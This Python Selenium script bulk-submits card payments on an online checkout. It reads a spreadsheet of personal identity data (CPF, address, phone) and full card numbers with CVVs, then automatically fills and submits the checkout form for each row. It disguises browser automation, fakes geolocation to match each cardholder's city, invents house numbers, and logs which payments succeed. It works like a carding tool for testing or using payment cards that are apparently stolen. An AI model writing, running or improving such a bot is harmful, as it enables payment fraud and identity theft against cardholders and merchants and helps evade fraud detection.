import csv
import random
import time
import os
import datetime
import pandas as pd
import PySimpleGUI as sg
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support.ui import Select
from selenium.common.exceptions import NoSuchElementException, UnexpectedAlertPresentException, TimeoutException, \
    ElementNotInteractableException, ElementNotInteractableException, ElementClickInterceptedException, \
    WebDriverException, NoAlertPresentException
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.support import expected_conditions as EC


os.chdir('C:\\PagCart\\')
pt = 'C:\\ProgramData\\ts-bin'
qtd_cons = 'C:\\ProgramData\\ts-bin\\vl.csv'
cache = 'cache.txt'


lista_cpf = sg.popup_get_file('Selecione a Planilha..')


if os.path.isfile(qtd_cons):
    with open(qtd_cons, "r") as fa:
        lines = fa.readlines()
else:
    f = open(qtd_cons, 'w')
    f.write('0')
    f.close()
    with open(qtd_cons, "r") as fa:
        lines = fa.readlines()

print(f'Total de Pagamentos realizados: {lines[0]}')
date = str(datetime.datetime.fromtimestamp(int(time.time())).strftime('%Y-%m-%d %H:%M:%S'))

if date >= '2022-03-05 06:00:00':
    sg.Popup('Hello!', 'Sua licença expirou!')
    try:
        f = open(cache, 'w')
        f.write(lines[0])
        f.close()
        os.rmdir(qtd_cons)
        os.rmdir(pt)
    except OSError as e:
        pass
    exit(69)
if os.path.isdir(pt):
    print("...")
else:
    exit(69)


options = webdriver.ChromeOptions() 
options.add_argument("start-maximized")
options.add_experimental_option("excludeSwitches", ["enable-automation"])
options.add_experimental_option('useAutomationExtension', False)

driver = webdriver.Chrome(options=options)
wait = WebDriverWait(driver, 30)

with open("link's.csv", 'r') as csv_file:
    csv_dict = csv.DictReader(csv_file, delimiter=';')
    for lin in csv_dict:
        url = lin['url']
       
        



if __name__=='__main__':
    
    consulta = pd.read_csv(lista_cpf, sep=';', dtype=str)
    consulta_livre = consulta[(consulta['STATUS'].isnull())]
    for ind_base, linha in consulta_livre.iterrows():
        ######## CONSULTA
        cpf = linha["CPF"]
        nome = linha['NOME']
        nasc = linha['DT_NASCIMENTO']
        uf = linha['UF']
        cidade = linha['CIDADE']
        endereco = linha['ENDERECO']
        bairro = linha['BAIRRO']
        cep = linha['CEP']
        celular = linha['CELULAR']
        email = linha['EMAIL']
        num_cart = linha['NUMERO DO CARTAO']
        validade = linha['VALIDADE']
        cvv = linha['CVV']

        
        from geopy.geocoders import Nominatim


        geolocator = Nominatim(user_agent="my_user_agent")
        city = cidade
        country = uf
        loc = geolocator.geocode(city+','+ country)
        print("latitude is :-" ,loc.latitude,"\nlongtitude is:-" ,loc.longitude)


        driver = webdriver.Chrome(options=options, executable_path='./chromedriver')
        wait = WebDriverWait(driver, 30)
        driver.get(url)

        driver.execute_script("window.navigator.geolocation.getCurrentPosition=function(success){"+
                                            "var position = {\"coords\" : {\"latitude\": \""+str(loc.latitude)+"\",\"longitude\": \""+str(loc.longitude)+"\"}};"+
                                            "success(position);}");

        print(driver.execute_script("var positionStr=\"\";"+
                                        "window.navigator.geolocation.getCurrentPosition(function(pos){positionStr=pos.coords.latitude+\":\"+pos.coords.longitude});"+
                                        "return positionStr;"))
        # set window position
        
        

        wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, '#__next > div > main > div > div > div > form > div > div > button'))).click()
        
        print("URL : " + driver.current_url)
        print(driver.title)

        numero = random.randint(1,2000)
        
        print(cpf, numero)
        try:
            name_id = '//*[@id="full-name"]/div/div/div[1]/input'
            wait.until(EC.presence_of_element_located((By.XPATH, name_id))).send_keys(nome)

            email_id = '//*[@id="email"]/div/div/div[1]/input'
            wait.until(EC.presence_of_element_located((By.XPATH, email_id))).send_keys(email)
            cpf_id = '//*[@id="cpf"]'
            wait.until(EC.presence_of_element_located((By.XPATH, cpf_id))).send_keys(cpf)
            cel_id = '//*[@id="mobile-phone-number"]'
            wait.until(EC.presence_of_element_located((By.XPATH, cel_id))).send_keys(celular)
            bt_cont = '//*[@id="form-button-personal-continue"]'
            wait.until(EC.presence_of_element_located((By.XPATH, bt_cont))).click()

            

            cep_id = '//*[@id="billing-zip-code"]/div/div/div[1]/input'
            wait.until(EC.presence_of_element_located((By.XPATH, cep_id))).send_keys(cep)
            try:
                rua_id = '//*[@id="billing-street"]/div/div/div/input'
                wait.until(EC.presence_of_element_located((By.XPATH, rua_id))).send_keys(endereco)
            except:
                pass
            time.sleep(3)
            try:
                numero_id = '//*[@id="step-shipping"]/form/div[1]/div[3]/div[2]/div/div/div/input'
                
                wait.until(EC.presence_of_element_located((By.XPATH, numero_id))).send_keys(numero)
            except:
                sg.popup_yes_no('erro')
            try:
                complement0_id = '//*[@id="billing-complement"]/div/div/div/input'
                wait.until(EC.presence_of_element_located((By.XPATH, complement0_id))).send_keys('casa')

                bairro_id = '//*[@id="billing-district"]/div/div/div/input'
                wait.until(EC.presence_of_element_located((By.XPATH, bairro_id))).send_keys(bairro)

                cidade_id = '//*[@id="billing-city"]/div/div/div/input'
                wait.until(EC.presence_of_element_located((By.XPATH, cidade_id))).send_keys(cidade)

                estado_id = '//*[@id="billing-state"]/div/div/div/select'
                try:
                    
                    element = WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, estado_id)))
                except:
                    None

                drp = Select(element)
                time.sleep(1)
                drp.select_by_value(uf)
            except:
                pass

            driver.find_element(By.XPATH,'//*[@id="form-button-shipping-continue"]').click()

            # dados cartao
            a = ''
            numCart_id = '//*[@id="credit-card-number"]/div/div/div[1]/input'
            wait.until(EC.presence_of_element_located((By.XPATH, numCart_id))).send_keys(num_cart)
            try:
                time.sleep(3)
                validade_id = '//*[@id="expiration-date"]/div/div/div/input'
                print(f'validade: {validade}')
                
                wait.until(EC.presence_of_element_located((By.XPATH, validade_id))).send_keys(validade.replace('/',''))
                    
            except Exception as e:
                print(e)

                a = e
            try:
                nameCart_id = '//*[@id="credit-card-full-name"]/div/div/div/input'
                wait.until(EC.presence_of_element_located((By.XPATH, nameCart_id))).send_keys(nome)

                cvv_id = '//*[@id="cvv"]/div/div/div/input'
                wait.until(EC.presence_of_element_located((By.XPATH, cvv_id))).send_keys(cvv)
            except Exception as e:
                print(e)

            # parcelamaneto

            parc_id = '//*[@id="installments"]/div/div/div[1]/select'
            
            elemento = WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, parc_id)))
            
            drp = Select(elemento)
            time.sleep(1)
            drp.select_by_value('1')

            

            bt_id = '//*[@id="credit-card-submit-btn"]'
            driver.find_element(By.XPATH, bt_id).click()

            try:
                alert_id = '//*[@id="step-payment"]/div/div/div[2]/div[1]/strong'
                texto = wait.until(EC.presence_of_element_located((By.XPATH, alert_id))).text
                
            except: 
                try:
                    pag = '//*[@id="__next"]/div/div/main/div/div/div/section[1]/div[1]/h2'
                    texto = wait.until(EC.presence_of_element_located((By.XPATH, pag))).text
                    with open(qtd_cons, "r") as fa:
                        lines = fa.readlines()
                    # print(lines)

                    q = int(lines[0]) 

                    q += 1
                    # print(q)
                    f = open(qtd_cons, 'w')
                    f.write(str(q))
                    f.close()
                except:
                    sg.popup_yes_no('oaoauu')

            print(texto)
            consulta.loc[ind_base, 'STATUS'] = texto

            consulta.to_csv(lista_cpf, sep=';', index=False)
            
        except:
            consulta.loc[ind_base, 'STATUS'] = "erro"

            consulta.to_csv(lista_cpf, sep=';', index=False)


            # finalizar compra
        driver.close()


   